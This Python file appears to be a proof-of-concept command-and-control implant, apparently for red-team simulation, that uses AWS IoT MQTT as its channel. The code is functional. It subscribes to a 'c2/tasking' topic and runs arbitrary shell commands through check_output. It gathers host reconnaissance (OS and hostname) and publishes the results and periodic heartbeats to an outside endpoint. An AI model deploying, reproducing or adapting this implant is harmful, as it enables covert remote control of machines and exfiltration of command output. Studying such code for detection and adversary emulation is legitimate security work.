# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0.

import argparse
import sys
import time
import json
import platform
from subprocess import check_output
from awscrt import io, mqtt, auth, http
from awsiot import mqtt_connection_builder


# Parse out command line args
parser = argparse.ArgumentParser(description="Simulate an implant that leverages the MQTT protocol for C2 using AWS IoT services.")
parser.add_argument('--endpoint', required=True, help="Your AWS IoT custom endpoint, not including a port. " +
                                                      "Ex: \"abcd123456wxyz-ats.iot.us-east-1.amazonaws.com\"")
parser.add_argument('--port', type=int, help="Specify port. AWS IoT supports 443 and 8883.")
parser.add_argument('--cert', help="File path to your client certificate, in PEM format.")
parser.add_argument('--key', help="File path to your private key, in PEM format.")
parser.add_argument('--root-ca', help="File path to root certificate authority, in PEM format. " +
                                      "Necessary if MQTT server uses a certificate that's not already in " +
                                      "your trust store.")
parser.add_argument('--client-id', default="sukoshi_client_id", help="Client ID for MQTT connection.")
parser.add_argument('--proxy-host', help="Hostname of proxy to connect to.")
parser.add_argument('--proxy-port', type=int, default=8080, help="Port of proxy to connect to.")
parser.add_argument('--verbosity', choices=[x.name for x in io.LogLevel], default=io.LogLevel.NoLogs.name,
    help='Logging level')

# Using globals to simplify PoC code
args = parser.parse_args()

# Set default implant dwell time in seconds
global dwell_time
dwell_time = 5

# Set implant running status
global running_status
running_status = True

# Initialize logging
io.init_logging(getattr(io.LogLevel, args.verbosity), 'stderr')


# Callback when connection is accidentally lost.
def on_connection_interrupted(connection, error, **kwargs):
    print("Connection interrupted. error: {}".format(error))


# Callback when an interrupted connection is re-established.
def on_connection_resumed(connection, return_code, session_present, **kwargs):
    print("Connection resumed. return_code: {} session_present: {}".format(return_code, session_present))

    if return_code == mqtt.ConnectReturnCode.ACCEPTED and not session_present:
        print("Session did not persist. Resubscribing to existing topics...")
        resubscribe_future, _ = connection.resubscribe_existing_topics()

        # Cannot synchronously wait for resubscribe result because we're on the connection's event-loop thread,
        # evaluate result with a callback instead.
        resubscribe_future.add_done_callback(on_resubscribe_complete)


# Callback when the resubscription is complete
def on_resubscribe_complete(resubscribe_future):
        resubscribe_results = resubscribe_future.result()
        print("Resubscribe results: {}".format(resubscribe_results))

        for topic, qos in resubscribe_results['topics']:
            if qos is None:
                sys.exit("Server rejected resubscribe to topic: {}".format(topic))


# Callback when tasking is published and received by the implant
def on_message_received(topic, payload, dup, qos, retain, **kwargs):
    print("Received message from topic '{}': {}".format(topic, payload))
    # Parse out tasking
    payload_json = json.loads(payload)
    # Dwell for time specified
    time.sleep(dwell_time)
    # Perform tasks
    task_results = perform_tasks(payload_json['task'], payload_json['arguments'])
    # Publish results
    publish_results(task_results)


# Function to perform tasks
def perform_tasks(task, arguments):
    if task == "ping":
        # For ping, just send back a pong
        message = {}
        message["contents"] = "pong"
        message["success"] = "true"
        message_json = json.dumps(message)
        return message_json
    elif task == "exec":
        # Perform command execution
        message = {}
        message["contents"] = check_output(arguments.split()).decode()
        message["success"] = "true"
        message_json = json.dumps(message)
        return message_json
    elif task == "host-recon":
        # Gather host recon data and format in JSON
        recon_payload = {}
        recon_payload["os_info"] = platform.system().lower()
        recon_payload["host_info"] = platform.node()
        recon_payload_json = json.dumps(recon_payload)
        # Construct results message for endpoint with recon data
        message = {}
        message["contents"] = recon_payload_json
        message["success"] = "true"
        message_json = json.dumps(message)
        return message_json
    elif task == "set-dwell-time":
        # Set the dwell time
        global dwell_time 
        dwell_time = int(arguments)
        message = {}
        message["contents"] = "Set dwell time to {} seconds.".format(arguments)
        message["success"] = "true"
        message_json = json.dumps(message)
        return message_json
    elif task == "exit":
        # Set the running status to false
        global running_status
        running_status = False
        message = {}
        message["contents"] = "Successfully received exit, quitting..."
        message["success"] = "true"
        message_json = json.dumps(message)
        return message_json
    else:
        # Default to replying with error message
        message = {}
        message["contents"] = "Unable to parse task, check that task is supported."
        message["success"] = "false"
        message_json = json.dumps(message)
        return message_json


# Function to publish results
def publish_results(result):
    # Publish the tasking results on MQTT connection
    print("Publishing message to topic '{}': {}".format("c2/results", result))
    mqtt_connection.publish(
        topic="c2/results",
        payload=result,
        qos=mqtt.QoS.AT_LEAST_ONCE)


# Function to disconnect from the endpoint
def disconnect():
    print("Disconnecting...")
    disconnect_future = mqtt_connection.disconnect()
    disconnect_future.result()
    print("Disconnected!")


if __name__ == '__main__':
    # Spin up resources
    event_loop_group = io.EventLoopGroup(1)
    host_resolver = io.DefaultHostResolver(event_loop_group)
    client_bootstrap = io.ClientBootstrap(event_loop_group, host_resolver)

    # Configure proxy if needed
    proxy_options = None
    if (args.proxy_host):
        proxy_options = http.HttpProxyOptions(host_name=args.proxy_host, port=args.proxy_port)

    # Configure the MQTT connection
    mqtt_connection = mqtt_connection_builder.mtls_from_path(
        endpoint=args.endpoint,
        port=args.port,
        cert_filepath=args.cert,
        pri_key_filepath=args.key,
        client_bootstrap=client_bootstrap,
        ca_filepath=args.root_ca,
        on_connection_interrupted=on_connection_interrupted,
        on_connection_resumed=on_connection_resumed,
        client_id=args.client_id,
        clean_session=False,
        keep_alive_secs=30,
        http_proxy_options=proxy_options)

    # Make connection to AWS IoT endpoint
    print("Connecting to {} with client ID '{}'...".format(
        args.endpoint, args.client_id))
    connect_future = mqtt_connection.connect()

    # Future.result() waits until a result is available
    connect_future.result()
    print("Connected!")

    # Subscribe and set the callback to work on tasking when available
    print("Subscribing to topic '{}'...".format("c2/tasking"))
    subscribe_future, packet_id = mqtt_connection.subscribe(
        topic="c2/tasking",
        qos=mqtt.QoS.AT_LEAST_ONCE,
        callback=on_message_received)

    subscribe_result = subscribe_future.result()
    print("Subscribed with {}".format(str(subscribe_result['qos'])))

    # Beaconing loop
    while running_status == True:
        # For demonstration purposes, there is an explicit heartbeat message being sent.
        # However, this is likely unnecessary in a production setting.

        # Construct heartbeat message
        message = {}
        message["contents"] = "heartbeat"
        message["success"] = "true"
        message_json = json.dumps(message)

        # Publish heartbeat
        print("Publishing message to topic '{}': {}".format("c2/heartbeat", message_json))
        mqtt_connection.publish(
        topic="c2/heartbeat",
        payload=message_json,
        qos=mqtt.QoS.AT_LEAST_ONCE)
        
        # Dwell for time specified
        time.sleep(dwell_time)

    # Close the connection
    disconnect()
